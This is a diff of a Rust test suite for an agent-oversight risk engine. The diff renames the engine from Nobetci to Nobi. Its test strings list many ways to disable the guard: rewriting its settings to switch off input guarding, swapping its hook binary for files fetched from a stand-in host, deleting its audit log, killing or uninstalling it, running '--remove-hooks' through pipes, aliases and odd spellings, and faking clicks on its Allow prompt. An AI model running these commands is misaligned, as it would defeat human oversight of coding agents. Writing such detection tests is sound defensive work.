@@ -102,35 +102,27 @@ fn write_path_spellings_meet_the_same_rule() {
     );
 }
 
-/// 1 Nobetci's own files on Linux vs Windows/macOS
+/// 1 Nobi's own files on Linux vs Windows/macOS
 #[test]
-fn nobetci_files_are_guarded_on_every_system() {
+fn nobi_files_are_guarded_on_every_system() {
     check(
         &[
             (
                 Critical,
                 "Bash",
-                r##"{"command": "echo '{\"autoAllowMax\":\"medium\",\"inputGuard\":false}' > ~/.config/nobetci/settings.json"}"##,
+                r##"{"command": "echo '{\"autoAllowMax\":\"medium\",\"inputGuard\":false}' > ~/.config/nobi/settings.json"}"##,
             ),
-            (Critical, "Bash", r##"{"command": "cp /tmp/evil ~/.local/share/nobetci/bin/nobetci-hook"}"##),
-            (Critical, "Bash", r##"{"command": "rm -f ~/.local/share/nobetci/audit.jsonl"}"##),
-            (
-                Critical,
-                "Bash",
-                r##"{"command": "echo x > \"$HOME/Library/Application Support/Nobetci/settings.json\""}"##,
-            ),
-            (Critical, "Bash", r##"{"command": "echo x > %APPDATA%\\Nobetci\\settings.json"}"##),
-            (Critical, "Bash", r##"{"command": "copy evil.exe %LOCALAPPDATA%\\Nobetci\\nobetci-hook.exe"}"##),
-            (Critical, "Write", r##"{"file_path": "/home/dev/.config/nobetci/settings.json", "content": "{}"}"##),
+            (Critical, "Bash", r##"{"command": "cp /tmp/evil ~/.local/share/nobi/bin/nobi-hook"}"##),
+            (Critical, "Bash", r##"{"command": "rm -f ~/.local/share/nobi/audit.jsonl"}"##),
+            (Critical, "Bash", r##"{"command": "echo x > \"$HOME/Library/Application Support/Nobi/settings.json\""}"##),
+            (Critical, "Bash", r##"{"command": "echo x > %APPDATA%\\Nobi\\settings.json"}"##),
+            (Critical, "Bash", r##"{"command": "copy evil.exe %LOCALAPPDATA%\\Nobi\\nobi-hook.exe"}"##),
+            (Critical, "Write", r##"{"file_path": "/home/dev/.config/nobi/settings.json", "content": "{}"}"##),
+            (Critical, "Write", r##"{"file_path": "/home/dev/.local/share/nobi/bin/nobi-hook", "content": "x"}"##),
             (
                 Critical,
                 "Write",
-                r##"{"file_path": "/home/dev/.local/share/nobetci/bin/nobetci-hook", "content": "x"}"##,
-            ),
-            (
-                Critical,
-                "Write",
-                r##"{"file_path": "/Users/dev/Library/Application Support/Nobetci/settings.json", "content": "{}"}"##,
+                r##"{"file_path": "/Users/dev/Library/Application Support/Nobi/settings.json", "content": "{}"}"##,
             ),
         ],
         false,
@@ -446,33 +438,33 @@ fn truncated_requests() {
     check(&[(High, "Bash", r##"{"command": "npm test"}"##)], true);
 }
 
-/// taking Nobetci out of the loop
+/// taking Nobi out of the loop
 #[test]
-fn taking_nobetci_out_of_the_loop() {
+fn taking_nobi_out_of_the_loop() {
     check(
         &[
-            (High, "Bash", r##"{"command": "pkill nobetci"}"##),
-            (High, "Bash", r##"{"command": "taskkill /im nobetci.exe /f"}"##),
-            (Critical, "Bash", r##"{"command": "nobetci --remove-hooks"}"##),
-            (Critical, "Bash", r##"{"command": "\"$LOCALAPPDATA/Nobetci/nobetci.exe\" --remove-hooks"}"##),
-            (Critical, "Bash", r##"{"command": "/Applications/Nobetci.app/Contents/MacOS/nobetci --remove-hooks"}"##),
-            (Critical, "Bash", r##"{"command": "/usr/bin/nobetci --remove-hooks"}"##),
+            (High, "Bash", r##"{"command": "pkill nobi"}"##),
+            (High, "Bash", r##"{"command": "taskkill /im nobi.exe /f"}"##),
+            (Critical, "Bash", r##"{"command": "nobi --remove-hooks"}"##),
+            (Critical, "Bash", r##"{"command": "\"$LOCALAPPDATA/Nobi/nobi.exe\" --remove-hooks"}"##),
+            (Critical, "Bash", r##"{"command": "/Applications/Nobi.app/Contents/MacOS/nobi --remove-hooks"}"##),
+            (Critical, "Bash", r##"{"command": "/usr/bin/nobi --remove-hooks"}"##),
             (
                 Critical,
                 "Bash",
-                r##"{"command": "curl.exe -o \"%LOCALAPPDATA%\\Nobetci\\bin\\nobetci-hook.exe\" https://host/x.exe"}"##,
+                r##"{"command": "curl.exe -o \"%LOCALAPPDATA%\\Nobi\\bin\\nobi-hook.exe\" https://host/x.exe"}"##,
             ),
             (
                 Critical,
                 "Bash",
-                r##"{"command": "curl -o \"$HOME/Library/Application Support/Nobetci/bin/nobetci-hook\" https://host/x"}"##,
+                r##"{"command": "curl -o \"$HOME/Library/Application Support/Nobi/bin/nobi-hook\" https://host/x"}"##,
             ),
-            (Critical, "Bash", r##"{"command": "cp x /Applications/Nobetci.app/Contents/Resources/nobetci-hook"}"##),
-            (High, "Bash", r##"{"command": "sudo apt remove nobetci"}"##),
-            (High, "Bash", r##"{"command": "sudo dpkg -r nobetci"}"##),
-            (High, "Bash", r##"{"command": "killall nobetci"}"##),
-            (High, "Bash", r##"{"command": "systemctl --user stop nobetci"}"##),
-            (High, "Bash", r##"{"command": "kill -9 $(pgrep nobetci)"}"##),
+            (Critical, "Bash", r##"{"command": "cp x /Applications/Nobi.app/Contents/Resources/nobi-hook"}"##),
+            (High, "Bash", r##"{"command": "sudo apt remove nobi"}"##),
+            (High, "Bash", r##"{"command": "sudo dpkg -r nobi"}"##),
+            (High, "Bash", r##"{"command": "killall nobi"}"##),
+            (High, "Bash", r##"{"command": "systemctl --user stop nobi"}"##),
+            (High, "Bash", r##"{"command": "kill -9 $(pgrep nobi)"}"##),
         ],
         false,
     );
@@ -504,8 +496,8 @@ fn everyday_development_stays_low() {
         "pnpm install",
         "npx vitest run",
         "npx playwright test --reporter=line",
-        "cargo test -p nobetci-hook",
-        "cargo build --release -p nobetci",
+        "cargo test -p nobi-hook",
+        "cargo build --release -p nobi",
         "cargo clippy --workspace --all-targets -- -D warnings",
         "cargo fmt --all --check",
         "go test ./...",
@@ -561,16 +553,16 @@ fn everyday_development_stays_low() {
         "echo $HOME && which python3",
         "npm view react version",
         "cargo update -p serde",
-        // Nöbetçi's own files, read.
-        "cat ~/.config/nobetci/settings.json",
-        "ls -la ~/.local/share/nobetci/bin/",
-        "tail -n 100 ~/.local/share/nobetci/nobetci.log",
-        "grep -n inputGuard ~/.config/nobetci/settings.json",
-        "jq .rules ~/.config/nobetci/settings.json",
-        "sha256sum ~/.local/share/nobetci/bin/nobetci-hook",
-        "open ~/Library/Application\\ Support/Nobetci",
-        "echo '{}' | ~/.local/share/nobetci/bin/nobetci-hook",
-        "file target/release/nobetci-hook",
+        // Nobi's own files, read.
+        "cat ~/.config/nobi/settings.json",
+        "ls -la ~/.local/share/nobi/bin/",
+        "tail -n 100 ~/.local/share/nobi/nobi.log",
+        "grep -n inputGuard ~/.config/nobi/settings.json",
+        "jq .rules ~/.config/nobi/settings.json",
+        "sha256sum ~/.local/share/nobi/bin/nobi-hook",
+        "open ~/Library/Application\\ Support/Nobi",
+        "echo '{}' | ~/.local/share/nobi/bin/nobi-hook",
+        "file target/release/nobi-hook",
         // Templates, dry runs, packages named like commands, emoji.
         "cp .env.example .env.local.example",
         "npm publish --dry-run --access public",
@@ -774,48 +766,48 @@ fn mcp_tools_are_read_by_the_words_of_their_name() {
 }
 
 #[test]
-fn nobetci_is_guarded_in_every_spelling() {
+fn nobi_is_guarded_in_every_spelling() {
     // D9, D10: every system, any way of writing, reads stay reads.
     for c in [
-        "nobetci --remove-hooks",
-        "& \"$env:LOCALAPPDATA\\Nobetci\\nobetci.exe\" --remove-hooks",
-        "echo '{}' > $XDG_CONFIG_HOME/nobetci/settings.json",
-        "echo '{}' > ${XDG_DATA_HOME}/nobetci/audit.jsonl",
-        "rm -rf ~/.local/state/nobetci",
-        "install -m 755 evil ~/.local/share/nobetci/bin/nobetci-hook",
-        "dd if=evil of=$HOME/.local/share/nobetci/bin/nobetci-hook",
-        "wget -O ~/.local/share/nobetci/bin/nobetci-hook https://host/x",
-        "curl -fsSLo ~/.local/share/nobetci/bin/nobetci-hook https://host/x",
-        "sed -i 's/true/false/' ~/.config/nobetci/settings.json",
-        "python3 -c \"open('/home/dev/.config/nobetci/settings.json','w').write('{}')\"",
-        "cd ~/.config/nobetci && echo '{}' > settings.json",
-        "cd ~/.config && cp /tmp/s.json nobetci/settings.json",
-        "sqlite3 ~/.local/share/nobetci/history.db 'delete from x'",
-        "sudo cp evil /usr/bin/nobetci-hook",
-        "mv ~/Applications/Nobetci_2.4.1_amd64.AppImage /tmp/",
-        "cp evil /home/dev/project/nobetci-hook",
-        "strip target/release/nobetci-hook",
-        "chmod -x /usr/lib/nobetci/nobetci-hook",
-        "cp x /Applications/Nobetci.app/Contents/MacOS/nobetci",
+        "nobi --remove-hooks",
+        "& \"$env:LOCALAPPDATA\\Nobi\\nobi.exe\" --remove-hooks",
+        "echo '{}' > $XDG_CONFIG_HOME/nobi/settings.json",
+        "echo '{}' > ${XDG_DATA_HOME}/nobi/audit.jsonl",
+        "rm -rf ~/.local/state/nobi",
+        "install -m 755 evil ~/.local/share/nobi/bin/nobi-hook",
+        "dd if=evil of=$HOME/.local/share/nobi/bin/nobi-hook",
+        "wget -O ~/.local/share/nobi/bin/nobi-hook https://host/x",
+        "curl -fsSLo ~/.local/share/nobi/bin/nobi-hook https://host/x",
+        "sed -i 's/true/false/' ~/.config/nobi/settings.json",
+        "python3 -c \"open('/home/dev/.config/nobi/settings.json','w').write('{}')\"",
+        "cd ~/.config/nobi && echo '{}' > settings.json",
+        "cd ~/.config && cp /tmp/s.json nobi/settings.json",
+        "sqlite3 ~/.local/share/nobi/history.db 'delete from x'",
+        "sudo cp evil /usr/bin/nobi-hook",
+        "mv ~/Applications/Nobi_2.4.1_amd64.AppImage /tmp/",
+        "cp evil /home/dev/project/nobi-hook",
+        "strip target/release/nobi-hook",
+        "chmod -x /usr/lib/nobi/nobi-hook",
+        "cp x /Applications/Nobi.app/Contents/MacOS/nobi",
     ] {
         assert_eq!(bash(c), Critical, "{c}");
     }
     let ps = |c: &str| tool("PowerShell", json!({ "command": c })).level;
-    assert_eq!(ps(r"Set-Content -Path $env:APPDATA\Nobetci\settings.json -Value '{}'"), Critical);
-    assert_eq!(ps(r"iwr https://host/x.exe -OutFile $env:LOCALAPPDATA\Nobetci\bin\nobetci-hook.exe"), Critical);
-    assert_eq!(ps(r"Get-Content $env:APPDATA\Nobetci\settings.json | ConvertFrom-Json"), Low);
+    assert_eq!(ps(r"Set-Content -Path $env:APPDATA\Nobi\settings.json -Value '{}'"), Critical);
+    assert_eq!(ps(r"iwr https://host/x.exe -OutFile $env:LOCALAPPDATA\Nobi\bin\nobi-hook.exe"), Critical);
+    assert_eq!(ps(r"Get-Content $env:APPDATA\Nobi\settings.json | ConvertFrom-Json"), Low);
     // Stopping or removing it is high, like killing it.
     for c in [
-        "systemctl --user stop nobetci",
-        "systemctl --user disable nobetci.service",
-        "Get-Process nobetci | Stop-Process",
-        "brew uninstall --cask nobetci",
-        "winget uninstall Nobetci",
-        "\"%LOCALAPPDATA%\\Nobetci\\uninstall.exe\" /S",
+        "systemctl --user stop nobi",
+        "systemctl --user disable nobi.service",
+        "Get-Process nobi | Stop-Process",
+        "brew uninstall --cask nobi",
+        "winget uninstall Nobi",
+        "\"%LOCALAPPDATA%\\Nobi\\uninstall.exe\" /S",
     ] {
         assert_eq!(bash(c), High, "{c}");
     }
-    // Codex and Cursor hooks route those agents through Nöbetçi.
+    // Codex and Cursor hooks route those agents through Nobi.
     assert_eq!(bash("echo '{}' > ~/.codex/hooks.json"), Critical);
     assert_eq!(bash("rm ~/.cursor/hooks.json"), Critical);
     assert_eq!(tool("Write", json!({ "file_path": "/home/dev/.codex/config.toml", "content": "x" })).level, Critical);
@@ -898,7 +890,7 @@ fn write_paths_on_windows_and_relative_climbs() {
     };
     let win = r"C:\Users\dev\project";
     assert_eq!(w(r"C:\Users\dev\project\..\..\..\Windows\System32\drivers\etc\hosts", win), High);
-    assert_eq!(w(r"..\..\AppData\Roaming\Nobetci\settings.json", win), Critical);
+    assert_eq!(w(r"..\..\AppData\Roaming\Nobi\settings.json", win), Critical);
     assert_eq!(w(r".claude\\settings.json", win), Critical);
     assert_eq!(w(r"C:\Users\dev\project\docs\a.md", win), Low);
     assert_eq!(w("/home/dev/project/src/../../.ssh/config", PROJECT), Critical);
@@ -1016,7 +1008,7 @@ fn a_file_copied_into_a_folder_lands_under_its_own_name() {
             ("cp a.txt b.txt && mv b.txt c.txt", Low),
             ("tar xzf data.tgz -C tmp/", Low),
             ("unzip archive.zip -d tmp/", Low),
-            ("cp target/release/nobetci-hook dist/", Low),
+            ("cp target/release/nobi-hook dist/", Low),
             ("mv notes.txt ~", Low),
             ("rm -rf node_modules", High),
             ("rm -rf ~/.cache", High),
@@ -1035,10 +1027,10 @@ fn scripts_that_write_protected_files_are_read_as_code() {
     levels(
         "Bash",
         &[
-            (r#"ruby -e 'File.write(Dir.home + "/.config/nobetci/settings.json", "{}")'"#, Critical),
-            (r#"perl -e 'open(F,">",$ENV{HOME}."/.config/nobetci/settings.json"); print F "{}"'"#, Critical),
+            (r#"ruby -e 'File.write(Dir.home + "/.config/nobi/settings.json", "{}")'"#, Critical),
+            (r#"perl -e 'open(F,">",$ENV{HOME}."/.config/nobi/settings.json"); print F "{}"'"#, Critical),
             (
-                "python3 - <<'EOF'\nimport json, os\np = os.path.expanduser('~/.config/nobetci/settings.json')\njson.dump({}, open(p,'w'))\nEOF",
+                "python3 - <<'EOF'\nimport json, os\np = os.path.expanduser('~/.config/nobi/settings.json')\njson.dump({}, open(p,'w'))\nEOF",
                 Critical,
             ),
             (
@@ -1049,17 +1041,17 @@ fn scripts_that_write_protected_files_are_read_as_code() {
                 "node <<'EOF'\nrequire('fs').writeFileSync(require('os').homedir()+'/.claude/settings.json','{}')\nEOF",
                 Critical,
             ),
-            (r#"awk 'BEGIN{print "{}" > "/home/dev/.config/nobetci/settings.json"}'"#, Critical),
+            (r#"awk 'BEGIN{print "{}" > "/home/dev/.config/nobi/settings.json"}'"#, Critical),
             (
                 r#"python3 -c "import os,json; json.dump({}, open(os.path.join(os.path.expanduser('~'),'.claude','settings.json'),'w'))""#,
                 Critical,
             ),
             (
-                r#"python3 -c "from pathlib import Path; (Path.home()/'.config'/'nobetci'/'settings.json').write_text('{}')""#,
+                r#"python3 -c "from pathlib import Path; (Path.home()/'.config'/'nobi'/'settings.json').write_text('{}')""#,
                 Critical,
             ),
             (
-                r#"node -e "require('fs').writeFileSync(require('path').join(require('os').homedir(), '.config', 'nobetci', 'settings.json'), '{}')""#,
+                r#"node -e "require('fs').writeFileSync(require('path').join(require('os').homedir(), '.config', 'nobi', 'settings.json'), '{}')""#,
                 Critical,
             ),
             // Code that only reads, and the interpreters themselves.
@@ -1193,7 +1185,7 @@ fn many_changes_of_folder_never_lose_the_folder() {
     // risk-engine#7: after 64 `cd`s the folder stopped being followed.
     let padded = format!("{}cd ~/.claude && echo '{{}}' > settings.json", "cd .; ".repeat(64));
     assert_eq!(bash(&padded), Critical);
-    let padded = format!("{}cd ~/.config/nobetci && echo '{{}}' > settings.json", "cd .; ".repeat(500));
+    let padded = format!("{}cd ~/.config/nobi && echo '{{}}' > settings.json", "cd .; ".repeat(500));
     assert_eq!(bash(&padded), Critical);
     // `cd -` goes back where it was.
     assert_eq!(bash("cd ~/.claude; cd /tmp; cd -; echo '{}' > settings.json"), Critical);
@@ -1210,14 +1202,14 @@ fn variables_defaults_patterns_and_braces_are_written_out() {
     levels(
         "Bash",
         &[
-            ("echo x > ${XDG_CONFIG_HOME:-$HOME/.config}/nobetci/settings.json", Critical),
-            ("D=~/.config/nobetci; echo '{\"inputGuard\":false}' > $D/settings.json", Critical),
+            ("echo x > ${XDG_CONFIG_HOME:-$HOME/.config}/nobi/settings.json", Critical),
+            ("D=~/.config/nobi; echo '{\"inputGuard\":false}' > $D/settings.json", Critical),
             ("export D=$HOME/.claude; echo '{}' > $D/settings.json", Critical),
             ("D=$HOME; F=.claude/settings.json; cp /tmp/x \"$D/$F\"", Critical),
             ("cp /tmp/evil ~/.claude/s*s.json", Critical),
             ("cp evil ~/.config/nob*/settings.json", Critical),
             ("cp evil ~/.c*/settings.json", Critical),
-            ("cp /tmp/evil ~/.local/share/nobetci/bin/nobetci-hoo?", Critical),
+            ("cp /tmp/evil ~/.local/share/nobi/bin/nobi-hoo?", Critical),
             ("echo x > ~/.claude/settings.[j]son", Critical),
             ("tee ~/.claude/{settings.json,x} < /tmp/evil", Critical),
             ("cp /tmp/evil {~/.claude/settings.json,/tmp/y}", Critical),
@@ -1236,18 +1228,16 @@ fn variables_defaults_patterns_and_braces_are_written_out() {
 fn powershell_dotnet_calls_that_write_files_are_writes() {
     // risk-engine#9
     let ps = |c: &str| tool("PowerShell", json!({ "command": c })).level;
-    assert_eq!(ps(r#"[IO.File]::WriteAllText("$env:APPDATA\Nobetci\settings.json", '{}')"#), Critical);
+    assert_eq!(ps(r#"[IO.File]::WriteAllText("$env:APPDATA\Nobi\settings.json", '{}')"#), Critical);
     assert_eq!(ps(r#"[System.IO.File]::AppendAllText("$env:USERPROFILE\.claude\settings.json", 'x')"#), Critical);
     assert_eq!(ps(r#"[System.IO.File]::Copy("evil.json", "$env:USERPROFILE\.claude\settings.json", $true)"#), Critical);
     assert_eq!(
-        ps(
-            r"Set-Content -Path ([Environment]::GetFolderPath('ApplicationData') + '\Nobetci\settings.json') -Value '{}'"
-        ),
+        ps(r"Set-Content -Path ([Environment]::GetFolderPath('ApplicationData') + '\Nobi\settings.json') -Value '{}'"),
         Critical
     );
     assert_eq!(ps(r#"[IO.File]::WriteAllText("$HOME\.bashrc", 'x')"#), High);
     // Reading, and writing an ordinary file.
-    assert_eq!(ps(r#"[IO.File]::ReadAllText("$env:APPDATA\Nobetci\settings.json")"#), Low);
+    assert_eq!(ps(r#"[IO.File]::ReadAllText("$env:APPDATA\Nobi\settings.json")"#), Low);
     assert_eq!(ps(r#"[IO.File]::WriteAllText("out.txt", 'x')"#), Low);
 }
 
@@ -1262,13 +1252,13 @@ fn mcp_tools_that_save_query_or_run_are_read_for_it() {
         ),
         (
             "mcp__files__download_file",
-            json!({ "url": "https://x.test/s", "destination": "~/.config/nobetci/settings.json" }),
+            json!({ "url": "https://x.test/s", "destination": "~/.config/nobi/settings.json" }),
             Critical,
         ),
         ("mcp__x__export_data", json!({ "format": "sh", "path": "/home/dev/.bashrc" }), High),
         (
             "mcp__playwright__browser_take_screenshot",
-            json!({ "filename": "/home/dev/.config/nobetci/settings.json" }),
+            json!({ "filename": "/home/dev/.config/nobi/settings.json" }),
             Critical,
         ),
         (
@@ -1292,7 +1282,7 @@ fn mcp_tools_that_save_query_or_run_are_read_for_it() {
         ("mcp__fs__write_file", json!({ "output_path": "/home/dev/.claude/settings.json", "content": "{}" }), Critical),
         (
             "mcp__fs__write_file",
-            json!({ "absolutePath": "/home/dev/.config/nobetci/settings.json", "content": "{}" }),
+            json!({ "absolutePath": "/home/dev/.config/nobi/settings.json", "content": "{}" }),
             Critical,
         ),
         ("mcp__fs__create_file", json!({ "uri": "file:///home/dev/.claude/settings.json", "content": "{}" }), Critical),
@@ -1321,31 +1311,31 @@ fn running_the_uninstaller_is_critical_and_mentioning_it_is_not() {
     levels(
         "Bash",
         &[
-            ("nobetci --remove-hooks", Critical),
+            ("nobi --remove-hooks", Critical),
             ("nob''etci --remove-hooks", Critical),
-            ("nobetci --remove-ho''oks", Critical),
+            ("nobi --remove-ho''oks", Critical),
             ("/usr/bin/nob* --remove-hooks", Critical),
-            ("\"$LOCALAPPDATA\"/Nobetci/nob*.exe --remove-hooks", Critical),
-            ("N=nobetci; $N --remove-hooks", Critical),
-            ("$(which nobetci) --remove-hooks", Critical),
-            ("sudo /opt/Nobetci/nobetci --remove-hooks", Critical),
-            ("bash -c 'nobetci --remove-hooks'", Critical),
-            ("git commit -m \"uninstall: nobetci --remove-hooks exits 1 when a file is left\"", Low),
-            ("echo 'nobetci --remove-hooks' >> docs/uninstall.md", Low),
+            ("\"$LOCALAPPDATA\"/Nobi/nob*.exe --remove-hooks", Critical),
+            ("N=nobi; $N --remove-hooks", Critical),
+            ("$(which nobi) --remove-hooks", Critical),
+            ("sudo /opt/Nobi/nobi --remove-hooks", Critical),
+            ("bash -c 'nobi --remove-hooks'", Critical),
+            ("git commit -m \"uninstall: nobi --remove-hooks exits 1 when a file is left\"", Low),
+            ("echo 'nobi --remove-hooks' >> docs/uninstall.md", Low),
             ("grep -rn -- --remove-hooks src/", Low),
-            ("echo nobetci --remove-hooks", Low),
-            (r"find / -name nobetci -exec {} --remove-hooks \;", Critical),
-            ("ls /usr/bin/nobetci* | xargs -I % % --remove-hooks", Critical),
-            ("cargo run -p nobetci -- --remove-hooks", Critical),
-            ("start nobetci --remove-hooks", Critical),
-            ("open -a Nobetci --args --remove-hooks", Critical),
-            ("gh pr create --title Hooks --body \"Explains nobetci --remove-hooks\"", Medium),
+            ("echo nobi --remove-hooks", Low),
+            (r"find / -name nobi -exec {} --remove-hooks \;", Critical),
+            ("ls /usr/bin/nobi* | xargs -I % % --remove-hooks", Critical),
+            ("cargo run -p nobi -- --remove-hooks", Critical),
+            ("start nobi --remove-hooks", Critical),
+            ("open -a Nobi --args --remove-hooks", Critical),
+            ("gh pr create --title Hooks --body \"Explains nobi --remove-hooks\"", Medium),
         ],
     );
     let ps = |c: &str| tool("PowerShell", json!({ "command": c })).level;
-    assert_eq!(ps(r#"& "$env:LOCALAPPDATA\Nobetci\nobetci.exe" --remove-hooks"#), Critical);
+    assert_eq!(ps(r#"& "$env:LOCALAPPDATA\Nobi\nobi.exe" --remove-hooks"#), Critical);
     assert_eq!(
-        ps(r#"Start-Process -FilePath "$env:LOCALAPPDATA\Nobetci\nobetci.exe" -ArgumentList '--remove-hooks' -Wait"#),
+        ps(r#"Start-Process -FilePath "$env:LOCALAPPDATA\Nobi\nobi.exe" -ArgumentList '--remove-hooks' -Wait"#),
         Critical
     );
 }
@@ -1410,9 +1400,10 @@ fn windows_spellings_of_a_protected_file_are_that_file() {
         r"C:\Users\dev\.claude\settings.json::$DATA",
         r"C:\Users\dev\.claude\settings.json.",
         r"C:\Users\dev\.claude\settings.json. . ",
-        r"C:\Users\dev\AppData\Roaming\Nobetci.\settings.json",
-        r"C:\Users\dev\AppData\Roaming\Nobetci \settings.json",
+        r"C:\Users\dev\AppData\Roaming\Nobi.\settings.json",
+        r"C:\Users\dev\AppData\Roaming\Nobi \settings.json",
         r"C:\Users\dev\AppData\Roaming\NOBETC~1\settings.json",
+        r"C:\Users\dev\AppData\Roaming\Nobetci\settings.json",
         r"C:\Users\dev\CLAUDE~1\SETTIN~1.JSO",
         r"C:\Users\dev\.claude\SETTIN~2.JSO",
     ] {
@@ -1544,7 +1535,7 @@ fn only_the_shell_tools_run_their_command() {
 
 #[test]
 fn programs_that_fake_clicks_and_keys_are_high() {
-    // Phase 3 (D23): a program that can click Nöbetçi's Allow or type into the
+    // Phase 3 (D23): a program that can click Nobi's Allow or type into the
     // terminal is high, whatever it clicks. Its name in prose, its help, a
     // package search, a read-only query are not.
     levels(
@@ -1552,7 +1543,7 @@ fn programs_that_fake_clicks_and_keys_are_high() {
         &[
             ("xdotool mousemove 1206 247 click 1", High),
             ("xdotool key ctrl+alt+a", High),
-            ("xdotool search --name Nobetci windowactivate --sync key Return", High),
+            ("xdotool search --name Nobi windowactivate --sync key Return", High),
             ("xdotool script.xdo", High),
             ("DISPLAY=:0 xdotool type hello", High),
             ("xte 'mouseclick 1'", High),
@@ -1574,7 +1565,7 @@ fn programs_that_fake_clicks_and_keys_are_high() {
             ("xdotool --help", Low),
             ("xdotool version", Low),
             ("xdotool getwindowfocus -f", Low),
-            ("xdotool search --name Nobetci", Low),
+            ("xdotool search --name Nobi", Low),
             ("xdotool getmouselocation", Low),
             ("git commit -m \"test with xdotool and XTestFakeButtonEvent\"", Low),
             ("apt search xdotool", Low),
@@ -1608,16 +1599,16 @@ fn removing_or_sweeping_a_folder_reaches_what_it_holds() {
     levels(
         "Bash",
         &[
-            ("find ~/.config -name settings.json -path '*nobetci*' -delete", Critical),
+            ("find ~/.config -name settings.json -path '*nobi*' -delete", Critical),
             ("find ~ -name settings.json -delete", Critical),
             ("find . -name '*.local.json' -delete", Critical),
             ("find ~/.config -delete", Critical),
-            ("rm /tmp/nobetci-1000/nobetci.sock", Critical),
+            ("rm /tmp/nobi-1000/nobi.sock", Critical),
             ("rm -rf ~/.local/share", Critical),
             ("find . -name '*.log' -delete", High),
             ("find . -type d -name node_modules -prune -exec rm -rf {} +", High),
             ("npx rimraf dist", High),
-            ("ls /tmp/nobetci-1000/", Low),
+            ("ls /tmp/nobi-1000/", Low),
         ],
     );
 }
@@ -1631,37 +1622,37 @@ fn the_uninstaller_run_through_a_pipe_a_variable_or_a_program_stays_critical() {
     levels(
         "Bash",
         &[
-            ("echo 'nobetci --remove-hooks' | sh", Critical),
-            ("printf 'nobetci --remove-hooks' | sh", Critical),
-            ("echo --remove-hooks | xargs nobetci", Critical),
-            ("nobetci $(echo --remove-hooks)", Critical),
-            ("R=--remove-hooks; nobetci $R", Critical),
-            ("git rebase -x 'nobetci --remove-hooks' HEAD~1", Critical),
-            ("git -c core.pager='nobetci --remove-hooks' log -1", Critical),
-            ("git -c alias.u='!nobetci --remove-hooks' u", Critical),
-            ("git submodule foreach 'nobetci --remove-hooks'", Critical),
-            ("git bisect run nobetci --remove-hooks", Critical),
-            ("git difftool -x 'nobetci --remove-hooks' HEAD", Critical),
-            ("gh alias set --shell u 'nobetci --remove-hooks' && gh u", Critical),
-            ("man -P 'nobetci --remove-hooks' ls", Critical),
-            ("script -c 'nobetci --remove-hooks' /dev/null", Critical),
-            ("tmux new -d 'nobetci --remove-hooks'", Critical),
-            ("env -S 'nobetci --remove-hooks'", Critical),
-            ("echo 'nobetci --remove-hooks' > /tmp/u.sh && sh /tmp/u.sh", Critical),
-            ("printf -v X 'nobetci --remove-hooks'; $X", Critical),
-            ("echo 'nobetci --remove-hooks' | tee u.sh", Critical),
+            ("echo 'nobi --remove-hooks' | sh", Critical),
+            ("printf 'nobi --remove-hooks' | sh", Critical),
+            ("echo --remove-hooks | xargs nobi", Critical),
+            ("nobi $(echo --remove-hooks)", Critical),
+            ("R=--remove-hooks; nobi $R", Critical),
+            ("git rebase -x 'nobi --remove-hooks' HEAD~1", Critical),
+            ("git -c core.pager='nobi --remove-hooks' log -1", Critical),
+            ("git -c alias.u='!nobi --remove-hooks' u", Critical),
+            ("git submodule foreach 'nobi --remove-hooks'", Critical),
+            ("git bisect run nobi --remove-hooks", Critical),
+            ("git difftool -x 'nobi --remove-hooks' HEAD", Critical),
+            ("gh alias set --shell u 'nobi --remove-hooks' && gh u", Critical),
+            ("man -P 'nobi --remove-hooks' ls", Critical),
+            ("script -c 'nobi --remove-hooks' /dev/null", Critical),
+            ("tmux new -d 'nobi --remove-hooks'", Critical),
+            ("env -S 'nobi --remove-hooks'", Critical),
+            ("echo 'nobi --remove-hooks' > /tmp/u.sh && sh /tmp/u.sh", Critical),
+            ("printf -v X 'nobi --remove-hooks'; $X", Critical),
+            ("echo 'nobi --remove-hooks' | tee u.sh", Critical),
             // Mentions stay low.
-            ("git commit -m \"$(cat <<'EOF'\nfix: nobetci --remove-hooks keeps foreign hooks\nEOF\n)\"", Low),
-            ("cat > docs/uninstall.md <<'EOF'\nRun nobetci --remove-hooks\nEOF", Low),
-            ("cd ~/nobetci && grep -rn -- --remove-hooks src/", Low),
-            ("git log --grep 'nobetci --remove-hooks' --oneline", Low),
+            ("git commit -m \"$(cat <<'EOF'\nfix: nobi --remove-hooks keeps foreign hooks\nEOF\n)\"", Low),
+            ("cat > docs/uninstall.md <<'EOF'\nRun nobi --remove-hooks\nEOF", Low),
+            ("cd ~/nobi && grep -rn -- --remove-hooks src/", Low),
+            ("git log --grep 'nobi --remove-hooks' --oneline", Low),
             ("find . -name '*.md' -exec grep -l -- --remove-hooks {} +", Low),
         ],
     );
     let ps = |c: &str| tool("PowerShell", json!({ "command": c })).level;
-    assert_eq!(ps("'nobetci --remove-hooks' | iex"), Critical);
-    assert_eq!(ps("Write-Output 'nobetci --remove-hooks' -OutVariable c; & $c"), Critical);
-    assert_eq!(ps("Write-Host 'Run nobetci --remove-hooks to uninstall'"), Low);
+    assert_eq!(ps("'nobi --remove-hooks' | iex"), Critical);
+    assert_eq!(ps("Write-Output 'nobi --remove-hooks' -OutVariable c; & $c"), Critical);
+    assert_eq!(ps("Write-Host 'Run nobi --remove-hooks to uninstall'"), Low);
 }
 
 #[test]
@@ -1669,13 +1660,13 @@ fn powershell_writes_through_a_variable_or_a_stream_are_writes() {
     // Item 2 (risk-engine#9 and #8).
     let ps = |c: &str| tool("PowerShell", json!({ "command": c })).level;
     for (c, want) in [
-        (r#"$p = "$env:APPDATA\Nobetci\settings.json"; [IO.File]::WriteAllText($p, '{}')"#, Critical),
-        (r#"$P = "$env:APPDATA\Nobetci\settings.json"; [IO.File]::WriteAllText($p, '{}')"#, Critical),
-        (r#"$p = "$env:APPDATA\Nobetci\settings.json""#, Critical),
-        (r#"$w = New-Object IO.StreamWriter "$env:APPDATA\Nobetci\settings.json"; $w.Close()"#, Critical),
-        (r#"$w = [IO.StreamWriter]::new("$env:APPDATA\Nobetci\settings.json"); $w.Close()"#, Critical),
-        (r#"New-Object System.IO.StreamWriter("$env:APPDATA\Nobetci\settings.json")"#, Critical),
-        (r#"[IO.FileStream]::new("$env:APPDATA\Nobetci\settings.json",'Create')"#, Critical),
+        (r#"$p = "$env:APPDATA\Nobi\settings.json"; [IO.File]::WriteAllText($p, '{}')"#, Critical),
+        (r#"$P = "$env:APPDATA\Nobi\settings.json"; [IO.File]::WriteAllText($p, '{}')"#, Critical),
+        (r#"$p = "$env:APPDATA\Nobi\settings.json""#, Critical),
